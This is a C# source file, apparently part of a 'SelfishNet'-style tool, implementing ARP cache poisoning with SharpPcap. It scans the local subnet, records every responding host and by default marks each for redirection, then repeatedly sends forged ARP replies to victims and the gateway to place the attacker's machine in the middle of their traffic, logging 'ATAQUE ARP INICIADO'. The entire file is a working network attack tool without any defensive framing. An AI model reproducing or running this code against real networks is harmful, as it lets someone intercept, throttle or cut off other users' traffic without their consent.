using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SelfishNetV4
{
    public class CArp : IDisposable
    {
        private bool isListeningArp;
        private bool isSpoofing;
        private bool isDiscovering;

        private PcList pcList;
        private LibPcapLiveDevice device;

        private Thread arpListenerThread;
        private Thread spoofingThread;
        private Thread discoveringThread;

        public byte[] localIP;
        public byte[] localMAC;
        public byte[] routerIP;
        public byte[] routerMAC;
        public byte[] broadcastMac;

        public CArp(LibPcapLiveDevice nic, PcList pclist)
        {
            this.pcList = pclist;
            this.device = nic;

            if (!device.Opened)
            {
                device.Open(DeviceModes.Promiscuous, 1000);
            }

            this.localMAC = device.MacAddress.GetAddressBytes();

            foreach (var addr in device.Interface.GatewayAddresses)
            {
                if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    this.routerIP = addr.GetAddressBytes();
                    break;
                }
            }

            foreach (var addr in device.Addresses)
            {
                if (addr.Addr.ipAddress != null &&
                    addr.Addr.ipAddress.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    this.localIP = addr.Addr.ipAddress.GetAddressBytes();
                    break;
                }
            }

            if (this.routerIP == null && this.localIP != null)
            {
                byte[] tempRouter = new byte[4];
                Array.Copy(this.localIP, tempRouter, 3);
                tempRouter[3] = 1;
                this.routerIP = tempRouter;
            }

            broadcastMac = new byte[] { 255, 255, 255, 255, 255, 255 };
        }

        public void startArpListener()
        {
            if (!isListeningArp)
            {
                isListeningArp = true;
                arpListenerThread = new Thread(arpListener);
                arpListenerThread.Start();
            }
        }

        private void arpListener()
        {
            device.Filter = "arp";
            while (isListeningArp)
            {
                PacketCapture pCapture;
                var status = device.GetNextPacket(out pCapture);
                if (status != GetPacketStatus.PacketRead) continue;

                var rawPacket = pCapture.GetPacket().Data;
                if (rawPacket.Length < 42) continue;

                byte[] srcMac = new byte[6];
                Array.Copy(rawPacket, 6, srcMac, 0, 6);
                if (tools.areValuesEqual(srcMac, localMAC)) continue;

                if (rawPacket[21] == 2)
                {
                    byte[] senderIp = new byte[4];
                    byte[] senderMac = new byte[6];
                    Array.Copy(rawPacket, 22, senderMac, 0, 6);
                    Array.Copy(rawPacket, 28, senderIp, 0, 4);

                    PC newPc = new PC();
                    newPc.ip = new IPAddress(senderIp);
                    newPc.mac = new PhysicalAddress(senderMac);
                    newPc.isGateway = tools.areValuesEqual(senderIp, routerIP);

                    newPc.Redirect = true;

                    if (newPc.isGateway) this.routerMAC = senderMac;

                    if (pcList.addPcToList(newPc))
                    {
                        Console.WriteLine($"[DETECTADO] IP: {newPc.ip} MAC: {newPc.mac}");
                    }
                }
            }
        }

        public void startArpDiscovery()
        {
            if (!isDiscovering)
            {
                isDiscovering = true;
                discoveringThread = new Thread(discoverer);
                discoveringThread.Start();
            }
        }

        private void discoverer()
        {
            if (routerIP != null)
            {
                for (int k = 0; k < 3; k++)
                {
                    SendArpRequest(new IPAddress(routerIP));
                    Thread.Sleep(100);
                }
            }

            byte[] currentIp = new byte[4];
            Array.Copy(localIP, currentIp, 3);

            for (int i = 1; i < 255; i++)
            {
                if (!isDiscovering) break;
                currentIp[3] = (byte)i;
                IPAddress target = new IPAddress(currentIp);

                if (!target.Equals(new IPAddress(localIP)) &&
                    (routerIP == null || !tools.areValuesEqual(routerIP, target.GetAddressBytes())))
                {
                    SendArpRequest(target);
                    Thread.Sleep(10);
                }
            }
            isDiscovering = false;
        }

        public void StartSpoofing()
        {
            if (!isSpoofing)
            {
                if (routerMAC == null)
                {
                    Console.WriteLine("¡ERROR! No tengo la MAC del Router.");
                    return;
                }
                isSpoofing = true;
                spoofingThread = new Thread(SpoofLoop);
                spoofingThread.Start();
                Console.WriteLine(">>> ATAQUE ARP INICIADO <<<");
            }
        }

        public void StopSpoofing()
        {
            isSpoofing = false;
            Console.WriteLine(">>> ATAQUE ARP DETENIDO <<<");
        }

        private void SpoofLoop()
        {
            while (isSpoofing)
            {
                for (int i = 0; i < pcList.pclist.Count; i++)
                {
                    PC target = (PC)pcList.pclist[i];

                    if (target.isLocalPc || target.isGateway) continue;

                    if (target.Redirect)
                    {
                        SendArpReply(target.mac.GetAddressBytes(), target.ip.GetAddressBytes(),
                                    localMAC, routerIP);

                        SendArpReply(routerMAC, routerIP,
                                    localMAC, target.ip.GetAddressBytes());
                    }
                }
                Thread.Sleep(2000);
            }
        }

        public void SendArpRequest(IPAddress targetIp)
        {
            byte[] packet = buildArpPacket(
                broadcastMac, localMAC, 1,
                localMAC, localIP,
                new byte[6], targetIp.GetAddressBytes()
            );
            try { device.SendPacket(packet); } catch { }
        }

        public void SendArpReply(byte[] destMac, byte[] destIp, byte[] srcMac, byte[] srcIp)
        {
            byte[] packet = buildArpPacket(
                destMac, localMAC, 2,
                srcMac, srcIp,
                destMac, destIp
            );
            try { device.SendPacket(packet); } catch { }
        }

        public byte[] buildArpPacket(byte[] destMac, byte[] srcMac, short arpType, byte[] arpSrcMac, byte[] arpSrcIp, byte[] arpDestMac, byte[] arpDestIP)
        {
            byte[] array = new byte[42];
            Array.Copy(destMac, 0, array, 0, 6);
            Array.Copy(srcMac, 0, array, 6, 6);
            array[12] = 8; array[13] = 6;
            array[14] = 0; array[15] = 1;
            array[16] = 8; array[17] = 0;
            array[18] = 6; array[19] = 4;
            array[20] = 0; array[21] = (byte)arpType;
            Array.Copy(arpSrcMac, 0, array, 22, 6);
            Array.Copy(arpSrcIp, 0, array, 28, 4);
            Array.Copy(arpDestMac, 0, array, 32, 6);
            Array.Copy(arpDestIP, 0, array, 38, 4);
            return array;
        }

        public void Dispose()
        {
            isListeningArp = false;
            isDiscovering = false;
            isSpoofing = false;
            if (device != null && device.Opened) device.Close();
        }
    }
}